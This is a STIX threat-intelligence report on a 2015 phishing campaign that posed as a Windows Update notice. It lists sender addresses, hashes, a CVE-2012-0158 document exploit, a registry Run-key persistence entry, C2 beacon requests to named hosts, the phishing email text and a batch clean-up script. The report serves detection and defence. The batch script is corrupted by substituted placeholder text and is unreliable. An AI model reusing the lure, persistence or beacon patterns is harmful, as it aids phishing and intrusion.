stix:STIX_Header.stix:Title: Phishing Emails with Keep Your PC Up to Date Theme
stix:STIX_Header.stix:Description: On 29 January 2015, a set of phishing emails with the subject "Keep your PC up to date" was observed. The emails were sent from "win_microsafe@yahoo.com" and "win_mikrosaft@yahoo.com" with the same email body and included the same malicious attachment, Keep your PC up to date.doc (MD5: 807EE30ABBBFCF0C6923E64B89BF4074). If executed successfully, the malware communicates with three command and control (C2) locations, "indrajoh.ns01.biz", "mono_is.dns05.com", and 118.193.206.179. As of 4 March 2015, the domains "indrajoh.ns01.biz" and "mono_is.dns05.com" both map to the IP Address 118.193.206.179.

boundary="344044665-449793859-1422581567=:11856" Subject: Keep your PC up to date From: [REDACTED] <win_mikrosaft@yahoo.com> To: [REDACTED] BCC: [REDACTED] Date: Fri Jan 30 01:32:47 GMT 2015 Attachment: Keep your PC up to date.doc (194968 bytes) ----- END EMAIL HEADERS ----- --- BEGIN EMAIL BODY --- With Windows Update, it's easy-and free. What is Windows Update? There's an easy, free way to help keep your PC safer and running smoothly. It's called Windows Update. All you have to do is turn it on, and you'll get the latest security and other important updates from Microsoft automatically. Setting up Windows Update is simple. If you've already got automatic updating turned on, Windows Update in Control Panel will open and show your update status. If it's not yet turned on, you'll be guided through the steps to do so. After that, all the latest security and performance improvements will be installed on your PC quickly and reliably. --- END EMAIL BODY ---

boundary="-847950152-220540943-1422582036=:10201" Subject: Keep your PC up to date From: [REDACTED] <win_microsafe@yahoo.com> To: [REDACTED] BCC: [REDACTED] Date: Fri Jan 30 01:40:36 GMT 2015 Attachment: Keep your PC up to date.doc (194968 bytes) ----- END EMAIL HEADERS ----- --- BEGIN EMAIL BODY --- With Windows Update, it's easy-and free. What is Windows Update? There's an easy, free way to help keep your PC safer and running smoothly. It's called Windows Update. All you have to do is turn it on, and you'll get the latest security and other important updates from Microsoft automatically. Setting up Windows Update is simple. If you've already got automatic updating turned on, Windows Update in Control Panel will open and show your update status. If it's not yet turned on, you'll be guided through the steps to do so. EmailMessageObj:Header.EmailMessageObj:Subject: Keep your PC up to date

stix:Indicator.indicator:Description:
The attachment "Keep your PC up to date.doc" is a malicious web archive file containing a CVE-2012-0158 exploit. If executed successfully the malware creates "C:\Documents and Settings\User\Local Settings\Temp\tmp1.tmp", benign MS Word documents "C:\Documents and Settings\User\Local Settings\Temp\Keep your PC up to date.doc" and "C:\Documents and Settings\User\Desktop\Keep your PC up to date.doc", and malicious DLL "C:\Documents and Settings\User\Application Data\Microsoft\Credentials\Credentials.ocx". Additionally, it adds persistence through the registry key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Credentials = Rundll32.exe "C:\Documents and Settings\Administrator\Application Data\Microsoft\Credentials\Credentials.ocx",SSSS", which will execute "Credentials.ocx" after reboot. Finally, the malware launches the benign Word Document "C:\Documents and Settings\User\Local Settings\Temp\Keep your PC up to date.doc".
By packaging the exploit within the MIME document (Web archive file) instead of RTF or OLE Word document, the malware appears to avoid detection by half or more of the AV products. This particular piece of malware may be a new version of previously reported versions.

cybox:Properties.FileObj:File_Name: Keep your PC up to date.doc

stix:Indicator.indicator:Description: The benign Windows Word decoy Document "Keep your PC up to date.doc" (MD5: 99108D4A19902C38743BE13A000ECB61) is created by the malicious attachment "Keep your PC up to date.doc" (MD5: 807EE30ABBBFCF0C6923E64B89BF4074). It is most likely used to trick the recipient into not informing IT of an issue.

cybox:Properties.FileObj:File_Name: Keep your PC up to date.doc

stix:Indicator.indicator:Description: The benign Windows Word decoy Document "Keep your PC up to date.doc" (MD5: 65FCD05451F0EF20D47680B6F98AE8F0) is created by the malicious attachment "Keep your PC up to date.doc" (MD5: 807EE30ABBBFCF0C6923E64B89BF4074). It is most likely used to trick the target into not informing IT of an issue.

cybox:Properties.FileObj:File_Name: Keep your PC up to date.doc

stix:Indicator.indicator:Description:
The malicious DLL "Credentials.ocx" is created by the malicious attachment "Keep your PC up to date.doc". "Credentials.ocx" has 3 exports: "Embedding", "SSSS", and "StartWork". Once the computer is rebooted, "Credentials.ocx" is executed by rundll32.exe with the argument "-SSSS". If the argument "StartWork" is used, batch clean-up script "UnI61.bat" is written and executed and the following key is added to the registry "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Credentials = Rundll32.exe "C:\Documents and Settings\Administrator\Application Data\Microsoft\Credentials\Credentials.ocx",SSSS". "Credentials.ocx" also tries to contact 2 domains and 1 IP and attempts to download a JPG image file.
If the JPG download is successful, "Credentials.ocx" stores the JPG image file in three randomly named .MSI files in "C:\Documents and Settings\User\Application Data\Tasks\", one file for each successful connections to the following locations: indrajoh.ns01.biz mono_is.dns05.com 118.193.206.179

The IP address is one of the locations the Malicious DLL "Credentials.ocx" attempts to communicate with. The following are HTTP Headers sent to the IP address:
GET /128.32.jpg HTTP/1.1 User-Agent: MSIE(Version of Internet Explorer); NT(Operating system version and platform); AV(Security product index); OV(<MS Office version>); NA(WINDOWS HOSTNAME) VR(RAT VERSION STRING) Host: 118.193.206.179 Cache-Control: no-cache

The domain "indrajoh.ns01.biz" is one of the locations the Malicious DLL "Credentials.ocx" attempts to communicate with. The following are some HTTP Headers sent to the domain:
GET /1281.32.jpg HTTP/1.1 User-Agent: MSIE(Version of Internet Explorer); NT(Operating system version and platform); AV(Security product index); OV(<MS Office version>); NA(WINDOWS HOSTNAME) VR(RAT VERSION STRING) Host: indrajoh.ns01.biz Cache-Control: no-cache
As of 4 March 2015, this domain currently maps to the IP address 118.193.206.179.

The Batch clean-up script "UnI61.bat" is only installed and executed if the DLL "Credentials.ocx" is run with argument "-StartWork". The following are the contents of the file:
:Repeat del "C:\Documents and Settings\User\Desktop\Credentials.ocx" Ping 127.Security product index.Security product index.1 -n 3 if exist "C:\Documents and Settings\User\Desktop\Credentials.ocx" goto Repeat del %Security product index

The domain "mono_is.dns05.com" is one of the locations that the Malicious DLL "Credentials.ocx" attempts to communicate with. The following are some HTTP Headers sent to the domain:
GET /1282.32.jpg HTTP/1.1 User-Agent: MSIE(<Version of Internet Explorer>); NT(<Operating system version and platform>); AV(<Security product index>); OV(<MS Office version>); NA(<WINDOWS HOSTNAME>) VR(<RAT VERSION STRING>) Host: mono_is.dns05.com Cache-Control: no-cache
As of 4 March 2015, this domain maps to the IP Address 118.193.206.179.

The file "Credentials.ocx" (MD5: BBA3D5C70DF5E8571658E6673AC96B17) is the 64-bit version of "Credentials.ocx" (MD5: A08BA2BE47BD921D1066D11477F8F3C6). It is only created if "Keep your PC up to date.doc" (MD5: 807EE30ABBBFCF0C6923E64B89BF4074) is run on a 64-bit Operating System. See "Credentials.ocx" (MD5: A08BA2BE47BD921D1066D11477F8F3C6) for full analysis of 32-bit version.
This registry entry is added by the malicious attachment Keep your PC up to date.doc (MD5: 807EE30ABBBFCF0C6923E64B89BF4074) in order to maintain persistence on an exploited system.
